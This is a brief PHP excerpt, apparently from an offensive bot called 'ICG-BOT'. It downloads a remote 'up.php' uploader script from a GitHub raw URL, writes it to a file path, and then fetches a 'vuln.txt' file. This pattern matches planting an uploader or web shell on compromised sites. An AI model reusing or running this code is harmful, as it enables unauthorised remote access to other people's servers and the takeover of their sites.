...
$text = http_get('https://raw.githubusercontent.com/apidotmy/ICG-BOT/main/files/up.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
...
$text2 = http_get('https://raw.githubusercontent.com/apidotmy/ICG-BOT/main/files/vuln.txt');
